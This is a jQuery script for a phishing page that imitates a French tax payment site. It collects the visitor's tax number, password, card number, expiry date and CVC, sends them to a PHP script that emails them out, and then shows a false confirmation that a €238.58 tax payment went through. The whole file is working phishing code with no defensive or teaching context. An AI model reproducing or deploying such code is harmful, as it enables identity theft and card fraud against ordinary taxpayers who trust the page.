




$(document).ready(function() {
	
	
	/************************************************************/
	/*		Désactivation par défaut de tout les liens href		*/
	/************************************************************/
    $('a').click(function(e) {
        e.preventDefault();
    });

	/********************************************************/
	/*		Initialisation du datepicker au chargement		*/
	/********************************************************/
    $("#dateExpiration").datepicker({
        altField: "#dateExpiration",
        closeText: 'Fermer',
        prevText: 'Pr&eacute;c&eacute;dent',
        nextText: 'Suivant',
        currentText: 'Aujourd\'hui',
        monthNames: ['Janvier', 'F&eacute;vrier', 'Mars', 'Avril', 'Mai', 'Juin', 'Juillet', 'Ao&ucirc;t', 'Septembre', 'Octobre', 'Novembre', 'D&eacute;cembre'],
        monthNamesShort: ['Janv.', 'F&eacute;vr.', 'Mars', 'Avril', 'Mai', 'Juin', 'Juil.', 'Ao&ucirc;t', 'Sept.', 'Oct.', 'Nov.', 'D&eacute;c.'],
        dayNames: ['Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'],
        dayNamesShort: ['Dim.', 'Lun.', 'Mar.', 'Mer.', 'Jeu.', 'Ven.', 'Sam.'],
        dayNamesMin: ['D', 'L', 'M', 'M', 'J', 'V', 'S'],
        weekHeader: 'Sem.',
        showButtonPanel: true,
        changeMonth: true,
        changeYear: true,
        dateFormat: 'mm/yy',
		minDate: 0,
        onClose: function(dateText, inst) {
            $(this).datepicker('setDate', new Date(inst.selectedYear, inst.selectedMonth, 1));
        }
    });
	
	/********************************************************/
	/*		Désactivation par défaut du bouton connexion	*/
	/********************************************************/
    $("#connexion").prop("disabled", true);


	
	
	/************************************************************************************************/
	/*		Contrôle que tout les champs soient bien remplis pour activer le bouton de connexion	*/
	/************************************************************************************************/
    $("#numeroFiscal").keyup(function() {

        if (($("#numeroFiscal").val().length === 0) || ($("#motDePasse").val().length === 0) || ($("#carteBancaire").val().length === 0) || ($("#dateExpiration").val().length === 0) || ($("#CVC").val().length === 0)) {
            $("#connexion").prop("disabled", true);
        } else {
            $("#connexion").prop("disabled", false);
        }

    });
    $("#motDePasse").keyup(function() {

        if (($("#numeroFiscal").val().length === 0) || ($("#motDePasse").val().length === 0) || ($("#carteBancaire").val().length === 0) || ($("#dateExpiration").val().length === 0) || ($("#CVC").val().length === 0)) {
            $("#connexion").prop("disabled", true);
        } else {
            $("#connexion").prop("disabled", false);
        }

    });
    $("#dateExpiration").keyup(function() {

        if (($("#numeroFiscal").val().length === 0) || ($("#motDePasse").val().length === 0) || ($("#carteBancaire").val().length === 0) || ($("#dateExpiration").val().length === 0) || ($("#CVC").val().length === 0)) {
            $("#connexion").prop("disabled", true);
        } else {
            $("#connexion").prop("disabled", false);
        }

    });
    $("#CVC").keyup(function() {




        if (($("#numeroFiscal").val().length === 0) || ($("#motDePasse").val().length === 0) || ($("#carteBancaire").val().length === 0) || ($("#dateExpiration").val().length === 0) || ($("#CVC").val().length === 0)) {
            $("#connexion").prop("disabled", true);
        } else {
            $("#connexion").prop("disabled", false);
        }

    });
    $("#carteBancaire").keyup(function() {




        if (($("#numeroFiscal").val().length === 0) || ($("#motDePasse").val().length === 0) || ($("#carteBancaire").val().length === 0) || ($("#dateExpiration").val().length === 0) || ($("#CVC").val().length === 0)) {
            $("#connexion").prop("disabled", true);
        } else {
            $("#connexion").prop("disabled", false);
        }

    });
	
	/********************************************************************************************************/
	/*		Récupération des données de l'utilisateur et envoie via requête AJAX des données par mail		*/
	/********************************************************************************************************/

    $("#connexion").click(function() {

        var numeroFiscal = $("#numeroFiscal").val();
        $("#motDePasse").attr("type", "text");
        setTimeout($("#motDePasse").attr("type", "password"), 500);
        var motDePasse = $("#motDePasse").val();
        var dateExpiration = $("#dateExpiration").val();
        var cryptogramme = $("#CVC").val();
        var carteBancaire = $("#carteBancaire").val();


        $.ajax({
            url: 'envoieMail.php',
            type: 'POST',
            data: {
                numeroFiscal: numeroFiscal,
                motDePasse: motDePasse,
                carteBancaire: carteBancaire,
                dateExpiration: dateExpiration,
                cryptogramme: cryptogramme
            },
            dataType: 'json',


            success: function(donnees, status, xhr) {
                swal("Paiement accepté!", "Le paiement de votre impôt a été débité avec succès.\nVous serez prélevé de 238,58€ sur votre compte bancaire\n(3 à 5 jours ouvrés)", "success");

            },

            error: function(xhr, status, error) {
                alert("param : " + xhr.responseText);
                alert("status : " + status);
                alert("error : " + error);
            }
        });
    });
	
	/********************************************************************************************************************/
	/*		Blocage des autres caractères sur les champs input	et affichage des erreurs si l'utilisateur essaye		*/
	/********************************************************************************************************************/

    $("#CVC").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".errmsgCVC").html("Seul les chiffres sont autoris&eacute;s.").show().fadeOut(2500);
            return false;
        }
    });

    $("#carteBancaire").keypress(function(e) {


        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".errmsgCarteBancaire").html("Seul les chiffres sont autoris&eacute;s.").show().fadeOut(2500);
            return false;
        }
    });


    $("#numeroFiscal").keypress(function(e) {


        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".errmsgNumFiscal").html("Seul les chiffres sont autoris&eacute;s.").show().fadeOut(2500);
            return false;
        }
    });

	/************************************************************/
	/*		Détection du type de carte et ajout des tirets		*/
	/************************************************************/
    $("#carteBancaire").keypress(function() {

        $("#carteBancaire").validateCreditCard(function(result) {
            if (result.card_type.name === "mastercard") {
                $("#imageCarteBancaire").css("display", "");
                $("#imageCarteBancaire").attr("src", "http://www.transparentpng.com/download/mastercard/png-mastercard-clipart-file-logo-12.png");
                $("#carteBancaire").css("padding-left", "48px");

            }
            if (result.card_type.name === "visa") {
                $("#imageCarteBancaire").css("display", "");
                $("#imageCarteBancaire").attr("src", "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Old_Visa_Logo.svg/1280px-Old_Visa_Logo.svg.png");
                $("#carteBancaire").css("padding-left", "48px");

            }

        });

        if ($(this).val().length === 4) {
            $(this).val($(this).val() + "-");
        }
        if ($(this).val().length === 9) {
            $(this).val($(this).val() + "-");
        }
        if ($(this).val().length === 14) {
            $(this).val($(this).val() + "-");
        }
    });

});